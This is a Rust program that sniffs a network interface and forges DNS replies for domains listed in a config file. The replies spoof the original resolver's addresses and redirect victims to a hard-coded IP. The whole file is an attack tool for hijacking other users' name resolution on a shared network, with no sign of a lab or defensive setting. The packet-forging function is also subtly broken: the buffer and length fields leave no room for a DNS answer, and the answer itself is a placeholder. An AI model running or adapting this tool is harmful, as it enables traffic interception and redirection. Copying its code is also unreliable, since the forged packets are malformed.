use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, Config, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
use pnet::packet::{Packet, PacketSize};
use serde::Deserialize;
use std::env;
use std::fs;
use std::net::Ipv4Addr;

#[derive(Deserialize)]
struct Settings {
    settings: SettingsInner,
}

#[derive(Deserialize)]
struct SettingsInner {
    domains: Vec<String>,
}

fn handle_packet(ethernet: &EthernetPacket, domains: &[String], tx: &mut Box<dyn pnet::datalink::DataLinkSender>) {
    match ethernet.get_ethertype() {
        EtherTypes::Ipv4 => {
            if let Some(header) = Ipv4Packet::new(ethernet.payload()) {
                match header.get_next_level_protocol() {
                    IpNextHeaderProtocols::Udp => {
                        if let Some(udp_packet) = UdpPacket::new(header.payload()) {
                            if is_dns_packet(&udp_packet) {
                                if let Some(domain_name) = extract_dns_query(&udp_packet) {
                                    if domains.iter().any(|d| domain_name.ends_with(d)) {
                                        println!("Intercepted DNS query for domain: {}", domain_name);
                                        send_fake_dns_response(ethernet, &header, &udp_packet, tx);
                                    }
                                }
                            }
                        }
                    }
                    _ => {}
                }
            }
        }
        _ => {}
    }
}

fn main() {
    let interface_name = env::args().nth(1).expect("Please provide an interface name");

    // Read configuration file
    let config_content = fs::read_to_string("config.toml").expect("Failed to read config file");
    let settings: Settings = toml::from_str(&config_content).expect("Failed to parse config file");

    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface: &NetworkInterface| iface.name == interface_name)
        .expect("Error getting interface");

    let config = Config::default();
    let (mut tx, mut rx) = match datalink::channel(&interface, config) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("An error occurred when creating the datalink channel: {}", e),
    };

    loop {
        match rx.next() {
            Ok(packet) => {
                if let Some(packet) = EthernetPacket::new(packet) {
                    handle_packet(&packet, &settings.settings.domains, &mut tx);
                }
            }
            Err(e) => {
                panic!("An error occurred while reading: {}", e);
            }
        }
    }
}

fn is_dns_packet(udp_packet: &UdpPacket) -> bool {
    let source_port = udp_packet.get_source();
    let destination_port = udp_packet.get_destination();
    source_port == 53 || destination_port == 53
}

fn extract_dns_query(udp_packet: &UdpPacket) -> Option<String> {
    let payload = udp_packet.payload();
    if payload.len() < 12 {
        return None;
    }

    let mut pos = 12;
    let mut domain_name = String::new();
    while pos < payload.len() {
        let len = payload[pos] as usize;
        if len == 0 {
            break;
        }
        if pos + len + 1 > payload.len() {
            return None;
        }

        let label = &payload[pos + 1..pos + 1 + len];
        domain_name.push_str(&String::from_utf8_lossy(label));
        domain_name.push('.');

        pos += len + 1;
    }

    if domain_name.ends_with('.') {
        domain_name.pop();
    }

    Some(domain_name)
}

fn send_fake_dns_response(
    ethernet: &EthernetPacket,
    ipv4: &Ipv4Packet,
    udp: &UdpPacket,
    tx: &mut Box<dyn pnet::datalink::DataLinkSender>,
) {
    let source_mac = ethernet.get_source();
    let dest_mac = ethernet.get_destination();
    let source_ip = ipv4.get_source();
    let dest_ip = ipv4.get_destination();
    let source_port = udp.get_source();
    let dest_port = udp.get_destination();

    let fake_ip = Ipv4Addr::new(1, 2, 3, 4); // Fake IP address to return

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(source_mac);
    ethernet_packet.set_source(dest_mac);
    ethernet_packet.set_ethertype(EtherTypes::Ipv4);

    let mut ipv4_packet = MutableIpv4Packet::new(ethernet_packet.payload_mut()).unwrap();
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(28);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
    ipv4_packet.set_source(dest_ip);
    ipv4_packet.set_destination(source_ip);

    let checksum = pnet::util::checksum(&ipv4_packet.to_immutable().packet(), 1);
    ipv4_packet.set_checksum(checksum);

    let mut udp_packet = MutableUdpPacket::new(ipv4_packet.payload_mut()).unwrap();
    udp_packet.set_source(dest_port);
    udp_packet.set_destination(source_port);
    udp_packet.set_length(8);
    
    let udp_payload = &mut udp_packet.payload_mut()[..];
    udp_payload[0] = 0; // Placeholder for actual DNS response payload
    udp_payload[1] = 0;

    let udp_checksum = pnet::util::checksum(&udp_packet.to_immutable().packet(), 0);
    udp_packet.set_checksum(udp_checksum);

    tx.send_to(ethernet_packet, None).unwrap().unwrap();
}
